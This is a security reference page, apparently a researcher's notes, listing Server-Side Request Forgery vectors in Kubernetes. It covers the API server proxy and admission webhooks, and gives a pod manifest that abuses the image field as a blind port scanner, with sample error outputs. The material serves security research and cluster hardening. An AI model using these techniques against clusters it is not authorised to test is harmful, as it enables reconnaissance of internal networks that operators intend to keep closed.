# Kubernetes SSRF

Kubernetes has a number of opportunities for Server-Side Request Forgery (SSRF) attacks due to the nature of its architecture. The goal of this page is to maintain a list of Known SSRF vulnerabilities in Kubernetes and either link to external articles which document them or, where there aren't any known articles on them, provide some technical details.

## Classes of SSRF in Kubernetes

There are essentially two classes of SSRF in Kubernetes, depending on the component that is co-erced into making requests on the attacker's behalf.

The first class is ones that target the control plane components (API Server, Scheduler, Controller Manager, etcd). These give the attacker the ability to make requests from the network that those components are hosted on

The second class is ones that target node components (Kubelet, Kube-proxy). Whilst these attacks are less likely to be significant (generally users have more access to the node network) there will be cases where cluster operators don't want users to be able to directly access the node network. Obviously clusters that are concerned about user access to the node network will also have to restrict things like Host networking in pods!

## Control Plane SSRF vectors

### Kubernetes API Server Proxy

This is the largest and most functional SSRF vector, as it supports arbitrary headers and methods. There is a post with details on the API server proxy [here](https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/)

### Validating Admission Webhooks

It's possible for users to specify a URL as part of configuring a Validating Admission Webhook, using a `validatingwebhookconfiguration` object. This allows for basic blind SSRF, the request sent can't be modified and you only get error messages back, but it can be used to create a basic port scanner as shown in [this post](https://raesene.github.io/blog/2023/01/02/Fun-with-SSRF-Turning-the-Kubernetes-API-server-into-a-port-scanner/)


## Node SSRF Vectors

### Pod Image Reference

In a Kubernetes pod there's a reference to the image to be used in the container, which is effectively a URL. It's possible to specify an IP address/Host name and also a port. You can use this as a basic blind SSRF vector that also provides error messages, allowing you to scan for open ports from the perspective of the Kubernetes node

The basic flow is to create a pod with the container image set to the target host and port

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ssrf-image-pod
spec:
  containers:
    - name: ssrf-image
      # change this to the URL you want to target
      image: caddy.pwndland.uk/image:test 
      command: ["sleep", "infinity"]
```

Then create the pod, and run `kubectl describe pod ssrf-image-pod` and look at the Events, to see what the result of the request was

**Valid Host and Port with an HTTP Server**

```
"caddy.pwndland.uk:80/image:test": failed to do request: Head "https://caddy.pwndland.uk:80/v2/image/manifests/test": http: server gave HTTP response to HTTPS client
```

**Valid Host and Valid HTTPS Port**

```
Failed to pull image "caddy.pwndland.uk/image:test": rpc error: code = Unimplemented desc = failed to pull and unpack image "caddy.pwndland.uk/image:test": failed to resolve reference "caddy.pwndland.uk/image:test": not implemented: media type "application/vnd.docker.distribution.manifest.v1+prettyjws" is no longer supported since containerd v2.0, please rebuild the image as "application/vnd.docker.distribution.manifest.v2+json" or "application/vnd.oci.image.manifest.v1+json"
```

**Valid Host, Invalid Port**

```
caddy.pwndland.uk:81/image:test": failed to do request: Head "https://caddy.pwndland.uk:81/v2/image/manifests/test": dial tcp 135.125.75.183:81: connect: connection refused
```

